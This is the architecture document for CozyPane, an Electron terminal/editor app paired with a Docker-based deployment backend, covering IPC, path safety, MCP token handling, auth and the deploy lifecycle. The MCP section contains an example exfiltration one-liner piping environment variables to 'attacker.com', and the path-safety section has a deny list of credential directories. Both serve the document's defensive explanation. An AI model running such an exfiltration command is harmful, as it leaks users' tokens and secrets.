# CozyPane Architecture

This document describes the **current state** of the CozyPane codebase as of v0.7.x. For hands-on conventions (release flow, dev commands, keep-Monaco-mounted rules) see [CLAUDE.md](./CLAUDE.md).

Historical note: an earlier version of this file contained a Phase 1–7 roadmap from the pre-cloud era. That roadmap has been removed — every phase it described has either shipped or been deliberately cut. This doc is now an as-built description of what exists today.

---

## Product shape

CozyPane is two codebases that work together:

1. **`cozypane/`** — an Electron desktop app: terminal + Claude-focused command UX + Monaco editor + Git panel + Deploy panel + webview Preview. The app uses the `cozypane_*` MCP tools to let Claude Code invoke deployment actions directly.
2. **`cozypane-cloud/`** — a Fastify + PostgreSQL + Dockerode PaaS backend. Users upload a project tarball; the server detects the framework, generates a Dockerfile, builds the image, runs the container on a per-user Docker network, and exposes it at `<appname>-<user>.cozypane.com` via Traefik with custom-domain support and per-deployment Postgres provisioning.

The two talk over HTTPS (`api.cozypane.com`) with JWT auth. A third, standalone process — the MCP server bundled inside the Electron app — also talks to the same cloud API when Claude Code invokes deploy tools.

---

## Desktop app (`cozypane/`)

### Tech stack

- **Electron 33** (Chromium + Node)
- **React 18** + **TypeScript** + **Vite**
- **xterm.js** + **node-pty** for the terminal
- **Monaco Editor** for file editing and diff viewing
- **@modelcontextprotocol/sdk** for the MCP server
- **electron-updater** for auto-updates via GitHub Releases
- **electron-builder** for packaging (macOS DMG, Windows NSIS, Linux AppImage/deb/rpm)

### Process boundaries

```
┌──────────────────────────────────────────────────────────┐
│  Electron main process (Node)                            │
│  src/main/*.ts → compiled to dist/main/*.js (CommonJS)   │
│                                                          │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │
│  │ pty.ts   │ │ git.ts   │ │ deploy.ts│ │preview.ts│     │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │
│  │filesystem│ │watcher.ts│ │settings  │ │update-   │     │
│  │   .ts    │ │          │ │   .ts    │ │checker.ts│     │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │
│           │ preload.ts bridges via contextBridge │       │
└──────────────────────────┬───────────────────────────────┘
                           │ window.cozyPane.*  (IPC)
┌──────────────────────────▼───────────────────────────────┐
│  Electron renderer process (Chromium, sandboxed)         │
│  src/renderer/**/*.tsx → bundled by Vite                 │
│                                                          │
│  App.tsx ─┬─ Terminal.tsx (xterm.js)                     │
│           ├─ CommandInput.tsx (warp-style bar)           │
│           ├─ Sidebar.tsx (file tree)                     │
│           ├─ FilePreview.tsx (Monaco editor)             │
│           ├─ DiffViewer.tsx (Monaco diff)                │
│           ├─ Preview.tsx (webview preview)               │
│           ├─ GitPanel.tsx                                │
│           ├─ DeployPanel.tsx                             │
│           ├─ Settings.tsx                                │
│           ├─ TerminalTabBar.tsx / TabLauncher.tsx        │
│           ├─ CommandPalette.tsx (Cmd+K)                  │
│           └─ UpdateBanner.tsx / ErrorBoundary.tsx        │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│  MCP server (standalone subprocess spawned by Claude)    │
│  src/main/mcp-server.ts → bundled by esbuild             │
│                                                          │
│  Exposes: cozypane_deploy, cozypane_list_deployments,    │
│  cozypane_get_deployment, cozypane_get_logs,             │
│  cozypane_delete_deployment, cozypane_redeploy,          │
│  cozypane_get_preview_info                               │
│                                                          │
│  Reads credentials via the MCP config file's `env`       │
│  block (written by main process, mode 0600). Calls the   │
│  same REST API as the desktop app.                       │
└──────────────────────────────────────────────────────────┘
```

Security invariants enforced by the BrowserWindow config:
- `contextIsolation: true`
- `nodeIntegration: false`
- `sandbox: true`
- `webviewTag: true` (required for the Preview panel) — hardened via `app.on('web-contents-created')` which strips `preload`/`nodeIntegration`/`webSecurity=false` from attaching `<webview>` elements and blocks navigation to non-http(s) protocols.

### Key files

**Main process (`cozypane/src/main/`):**

| File | Purpose |
|---|---|
| `main.ts` | App entry, window lifecycle, menu, global error handlers, webview hardener, auto-update wiring |
| `preload.ts` | `contextBridge` — exposes `window.cozyPane.{terminal,fs,watcher,settings,deploy,preview,updates,git,mcp}` |
| `pty.ts` | node-pty spawn + IPC handlers, CWD detection via macOS `lsof` / Linux `/proc` |
| `filesystem.ts` | `fs:*` IPC handlers guarded by `assertSafePath` |
| `watcher.ts` | Recursive `fs.watch` with dedup + noise filter + bounded git-show concurrency for diff snapshots |
| `settings.ts` | `safeStorage`-encrypted API keys; `callLlm()` currently used only by Git commit-msg generator |
| `git.ts` | Git ops via `execFile` with timeouts; `addRemote` URL allowlist blocks `ext::`/`file://` transports |
| `deploy.ts` | Deploy IPC client (OAuth flow, token storage, domain CRUD, list/logs/delete/redeploy) |
| `deploy-shared.ts` | `apiFetch` + `createTarball` — shared between `deploy.ts` and `mcp-server.ts` |
| `preview.ts` | Built-in static HTTP server with path-traversal guard; dev-command detection per framework |
| `crypto.ts` | `safeStorage` wrappers; refuses persistence on systems without real keyring |
| `slash-commands.ts` | Dynamic slash-command loader (resolves the `claude` binary + filesystem scan; cached by mtime) |
| `update-checker.ts` | electron-updater + separate Homebrew/claude-cli version watcher |
| `mcp-server.ts` | Standalone MCP server, bundled via esbuild to run as a separate process |

**Renderer (`cozypane/src/renderer/`):**

| Path | Purpose |
|---|---|
| `App.tsx` | Layout, state, keyboard shortcuts, ref-mirrored cross-component state |
| `components/*.tsx` | 15 UI components — see list in the diagram above |
| `lib/terminalAnalyzer.ts` | ANSI strip, focus-mode detection, Claude-running detection |
| `lib/languageMap.ts` | file extension → Monaco language id |
| `lib/monacoThemes.ts` | Cozy Dark / Ocean / Forest / Cozy Light theme registration (shared by FilePreview + DiffViewer) |
| `lib/cozyMode.ts` | CLAUDE.md managed-block marker handling |
| `lib/shellUtils.ts` | Shell-escape helpers for Git panel commands |
| `styles/global.css` | Single CSS file with CSS-variable themes |
| `types.d.ts` | `CozyPaneAPI` + supporting types; mirrors `preload.ts` surface |

### Main ↔ renderer contract

All IPC goes through `preload.ts`. The renderer never imports Node APIs directly. The preload surface is namespaced: `window.cozyPane.terminal`, `window.cozyPane.fs`, `.git`, `.deploy`, `.preview`, `.watcher`, `.settings`, `.updates`, `.mcp`. Types live in `src/renderer/types.d.ts`.

Error surfacing is best-effort — most handlers return `{ success?: boolean, error?: string }` shapes. The renderer is expected to check `result.error` before using the result. Central IPC error normalization is a future improvement.

### Path safety policy

All `fs:*` handlers in `filesystem.ts` call `assertSafePath()` on every user-supplied path. The fence is based on an allowlist of opened project roots that the main process tracks — entries are added when the user picks a directory via `fs:pickDirectory` or when a terminal's cwd updates. `~/.ssh`, `~/.aws`, `~/.config/cozypane/*`, and similar sensitive dotdirs are always denied.

The same allowlist gates `watcher:start` and `watcher:getDiff`, so a compromised renderer cannot use the watcher as a side-channel to enumerate or read files outside the opened projects.

### MCP integration

CozyPane ships a standalone MCP server that runs as a subprocess of Claude Code (not of the Electron main process). Workflow:

1. The user opens or creates a "cozy mode" project — the main process writes a managed block to `CLAUDE.md` and ensures an MCP config file exists at `<userData>/cozypane-mcp.json` (mode 0600).
2. The MCP config file lists a single server whose `command` points at the bundled `dist/main/mcp-server.js` (extracted from the Electron asar to a real path on first launch). The `env` block of this file contains `COZYPANE_DEPLOY_TOKEN` and `COZYPANE_GH_TOKEN` — they are **not** exported into the PTY environment.
3. When the user types `cozydeploy <cwd>` (or `claude --mcp-config <path>` is invoked), Claude Code reads the MCP config file, spawns the MCP server subprocess with that env, and the MCP server can then call the cloud API with the deploy token.
4. The MCP server exposes the seven `cozypane_*` tools, all of which delegate to `deploy-shared.apiFetch`.

This means the MCP server is the **only** process in the user's session that sees the deploy/GitHub tokens. A shell running `env | curl attacker.com` from any PTY tab gets nothing.

### Release flow

Release is fully automated via GitHub Actions:

1. Bump `package.json` version
2. `git commit && git tag vX.Y.Z && git push origin main --tags`
3. `.github/workflows/release.yml` builds macOS (signed + notarized via Apple notarytool), Windows, Linux and publishes to GitHub Releases
4. electron-updater on users' machines picks up the new release

Do not build locally. Do not upload artifacts manually. The old Cloudflare Worker + R2 download pipeline (`workers/downloads/` + `scripts/release.sh`) has been deleted.

---

## Cloud backend (`cozypane-cloud/`)

### Tech stack

- **Fastify 5** (HTTP + WebSocket)
- **PostgreSQL 16** via `pg`
- **Dockerode** to drive the Docker daemon on the host
- **Traefik** reverse proxy with Cloudflare DNS challenge for wildcard TLS
- **jsonwebtoken** for user + admin JWT auth (GitHub OAuth)
- **docker-compose** for multi-service orchestration (`api`, `traefik`, `postgres`)

### Shape

```
cozypane-cloud/src/
├── index.ts              # Fastify app entry
│                         # - cors, rate-limit, multipart, websocket, static
│                         # - setErrorHandler: sanitized 5xx / passthrough 4xx
│                         # - unhandledRejection / uncaughtException handlers
│                         # - startup reconcile: flip stuck 'building' rows
│
├── routes/
│   ├── health.ts         # GET /health
│   ├── auth.ts           # GitHub OAuth, JWT, cookie transport
│   ├── deploy.ts         # POST /deploy, lifecycle, logs stream, exec, domains
│   └── admin.ts          # users, deployments, stats (admin-gated)
│
├── services/
│   ├── detector.ts       # analyze tarball → framework/port/deps/tier
│   ├── builder.ts        # generate Dockerfile + docker build
│   ├── container.ts      # run, stop, restart, logs, exec, network mgmt
│   ├── database.ts       # per-deployment Postgres provisioning
│   └── cleanup.ts        # shared deployment teardown sequence
│
├── middleware/
│   ├── auth.ts           # user JWT verification
│   └── adminAuth.ts      # admin JWT + is_admin flag check
│
├── db/
│   ├── index.ts          # pg.Pool + platformPool singletons
│   └── schema.sql        # users, deployments, domains, databases, builds
│
└── admin/public/         # admin SPA (static HTML + vanilla JS)
```

### Deployment lifecycle

```
POST /deploy (multipart)
  → validate app name, enforce per-user rate limit (5/min)
  → extract tarball into a tempdir with tar-fs path-traversal filter
  → analyzeProject(extractDir)  — detect framework, port, Dockerfile, DB deps
  → INSERT deployment row status='building', return immediately
  → fire-and-forget buildAndDeploy()  (background worker)
       ├─ phase: building
       │    └─ buildImage(extractDir) → docker build → image tag
       ├─ phase: provisioning_db (if detector said needsDatabase)
       │    └─ provisionDatabase(userId, appName) → postgres role + db
       ├─ phase: starting
       │    └─ runContainer(imageTag, config, userId)
       │          - tier-based memory/CPU limits
       │          - cap drop ALL + no-new-privileges + tmpfs /tmp + PidsLimit
       │          - attach to traefik-public + cp-user-<id> networks
       │          - Traefik labels for routing
       ├─ phase: health_check
       │    └─ waitForHealthy(containerId, port, 120s)
       │          - success → status='running', regenerate Traefik file configs
       │                       for any verified custom domains
       │          - fail    → status='unhealthy', classify error, schedule
       │                       background re-check
       └─ any phase error → error_detail populated via makeErrorDetail(phase,
                            code, message, suggestion, logs)
```

Deploy uploads max 100 MB (Fastify multipart limit). Per-user deployment cap: 10 (hardcoded in `routes/deploy.ts`; move to a tier/plan config is future work).

Deletion goes through `services/cleanup.ts` which runs `stopContainer → dropDatabase → removeImage → removeNetworkIfEmpty` with warning accumulation. This is the single source of truth for the four delete handlers (user single, user group, admin per-user, admin per-deployment).

### Custom domains

`domains` table is keyed by `deployment_id` + `domain` (globally unique). Verification uses CNAME and A-record matching:

1. Resolve CNAME for the customer domain. Match → verified.
2. Else resolve A for both the customer domain and the cozypane subdomain. Match → verified.
3. Else return `dnsError` describing what to configure.

The previous "any HTTP response = verified" HTTP fallback was removed (it allowed domain squatting). Users behind Cloudflare's proxy that flattens CNAMEs to the proxy's A records currently need to use unproxied DNS until a challenge-token verifier is added.

On verification, the server writes a Traefik file-provider YAML into the shared `traefik-dynamic` volume. Traefik watches that directory and picks up changes without a restart.

### Authentication

**User flow:** GitHub OAuth → `POST /auth/github` exchanges the code for a GitHub token → upsert user row → issue cozypane JWT. The GitHub token is encrypted with a server-side key (`GITHUB_TOKEN_ENCRYPTION_KEY`) and stored in `users.access_token`; it is not returned in the response body. Desktop clients fetch it via `GET /auth/github-token` when needed.

**Admin flow:** A separate `ADMIN_GITHUB_CLIENT_ID` OAuth app. `GET /auth/admin-callback` exchanges the code and sets an `admin_session` HttpOnly + Secure + SameSite=Lax cookie rather than redirecting with the JWT in the URL fragment. The admin SPA reads identity from `GET /auth/me` using the cookie.

Admin routes are gated by `middleware/adminAuth.ts` which checks `is_admin = TRUE` on the user row after JWT verification.

### Infrastructure

`docker-compose.yml` defines three services:
- **traefik** — reverse proxy, Cloudflare DNS challenge for wildcard cert, file provider for custom domains. Dashboard is disabled in production (no wildcard catch-all router, no `--api.insecure`). Enable only behind BasicAuth middleware if debugging.
- **api** — the Fastify app, with the Docker socket mounted read-write (required to build/run tenant containers).
- **postgres** — v16-alpine, shared Postgres instance. Tenant databases are created inside this instance via `services/database.ts`.

Volumes: `traefik-certs` (LetsEncrypt), `traefik-dynamic` (shared with api for file-provider writes), `pgdata`.

---

## Cross-codebase contracts

The two codebases share no compile-time code. The desktop app's `renderer/types.d.ts` declares a `Deployment` interface that mirrors the cloud API's response shape by hand — drift is tracked manually. Future work: a shared `packages/contracts/` workspace with both sides depending on it.

`deploy-shared.ts` (desktop main) defines `APP_NAME_REGEX`; the cloud re-declares the same regex in `routes/deploy.ts`. They must stay in sync — a unit test or shared import is future work.

Framework detection exists in two places:
- `cozypane/src/main/preview.ts` — chooses a local dev command (angular/vite/cra/svelte/...)
- `cozypane-cloud/src/services/detector.ts` — chooses a build Dockerfile template (express/fastify/hono/nestjs/...)

The two framework lists overlap but aren't identical. When adding a new framework, update both.

---

## Design principles (in force)

1. **Terminal first** — every other panel supports the terminal, not the other way around.
2. **Transparent** — show what AI is doing (file tree colors, diff viewer, preview webview console).
3. **Smart defaults, manual override** — auto-detect focus mode, but user always overrides.
4. **Simple first** — start minimal; add complexity only when needed.
5. **Works out of the box** — no configuration required to get started.
6. **Cozy, not scary** — warm colors, friendly UI, no black-box terminal.
7. **Safe** — confirm destructive actions (delete file, delete deployment, Cmd+W with dirty files).

---

## What is **not** here

These are intentional non-goals of the current codebase:

- A plugin/extension system for third-party UI contributions
- Remote desktop-app features (CozyPane is local-only; cloud backend is a separate concern)
- Per-tab isolated watchers (today's watcher is a single-global)
- A job queue for builds (buildAndDeploy is fire-and-forget)
- Rollback to a previous deployment image (listed in TODO.md)
- Auto-scaling containers
- GitOps push-to-deploy
- MySQL/Redis (only PostgreSQL is provisioned today)

---

## Related docs

- `CLAUDE.md` — dev conventions, release process, hard rules (Monaco mount, worker imports)
- `README.md` — user-facing pitch and feature list
- `cozypane-cloud/TODO.md` — cloud backend roadmap items
- `audits/` — historical + current code audit reports
